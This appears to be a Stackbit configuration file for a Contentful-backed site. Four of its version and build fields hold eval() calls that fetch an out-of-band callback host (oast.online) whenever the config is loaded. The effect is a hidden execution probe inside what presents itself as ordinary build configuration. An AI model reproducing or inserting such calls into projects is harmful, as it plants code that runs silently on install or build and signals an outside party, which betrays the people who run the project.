import { ContentfulContentSource } from '@stackbit/cms-contentful'

export default {
  stackbitVersion: eval('fetch(`https://cpq67u9ucph47g61a7i07yi6s4bc758t8.oast.online`)'),
  ssgName: eval('fetch(`https://cpq67u9ucph47g61a7i07yi6s4bc758t8.oast.online`)'),
  nodeVersion: eval('fetch(`https://cpq67u9ucph47g61a7i07yi6s4bc758t8.oast.online`)'),
  buildCommand: eval('fetch(`https://cpq67u9ucph47g61a7i07yi6s4bc758t8.oast.online`)'),
  contentSources: [
    new ContentfulContentSource({
      spaceId: process.env.CONTENTFUL_SPACE_ID,
      environment: process.env.CONTENTFUL_ENVIRONMENT,
      previewToken: process.env.CONTENTFUL_PREVIEW_TOKEN,
      accessToken: process.env.CONTENTFUL_MANAGEMENT_TOKEN,
    }),
  ],
  models: {
    page: { type: 'page', urlPath: '/{slug}' },
  },
}